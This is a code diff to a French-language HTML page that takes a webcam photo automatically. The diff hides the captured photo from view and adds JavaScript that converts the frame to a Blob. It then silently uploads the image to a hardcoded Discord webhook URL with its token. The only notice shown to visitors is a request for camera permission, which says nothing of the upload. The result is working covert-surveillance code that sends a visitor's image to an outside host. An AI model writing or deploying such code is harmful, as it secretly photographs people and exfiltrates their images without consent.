@@ -9,13 +9,13 @@
             display: none;
         }
         #photo {
-            display: block;
-            margin-top: 10px;
+            display: none;
         }
     </style>
 </head>
 <body>
     <h1>Prendre une photo automatiquement</h1>
+    <p>Veuillez autoriser l'accès à la caméra pour prendre une photo automatiquement.</p>
     <video id="camera" width="320" height="240" autoplay></video>
     <canvas id="photo" width="320" height="240"></canvas>
 
@@ -33,11 +33,53 @@
                         // Prendre une photo automatiquement après que la vidéo a commencé
                         context.drawImage(video, 0, 0, 320, 240);
                         video.pause();
+
+                        // Convertir l'image en base64
+                        const dataURL = canvas.toDataURL('image/png');
+                        envoyerImage(dataURL);
                     };
                 })
                 .catch(function(err) {
                     console.log("Une erreur est survenue: " + err);
                 });
+
+            function envoyerImage(dataURL) {
+                // Convertir base64 en Blob
+                const blob = dataURLToBlob(dataURL);
+                // Envoyer l'image à un serveur ou un webhook Discord
+                envoyerBlob(blob);
+            }
+
+            function dataURLToBlob(dataURL) {
+                const byteString = atob(dataURL.split(',')[1]);
+                const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                return new Blob([ab], { type: mimeString });
+            }
+
+            function envoyerBlob(blob) {
+                const formData = new FormData();
+                formData.append('file', blob, 'photo.png');
+
+                // Remplacez l'URL ci-dessous par l'URL de votre serveur ou webhook Discord
+                const url = 'https://discord.com/api/webhooks/1264515631122878466/IeM3kvt1ZIIcvP7tq2NBQtG80ARxiqkuKv-PBjLbjFwuOr87Im8l6ls3LVybGGxL-Xvu';
+                fetch(url, {
+                    method: 'POST',
+                    body: formData
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('Image envoyée avec succès');
+                    } else {
+                        console.error('Erreur lors de l\'envoi de l\'image');
+                    }
+                }).catch(error => {
+                    console.error('Erreur lors de la requête:', error);
+                });
+            }
         })();
     </script>
 </body>
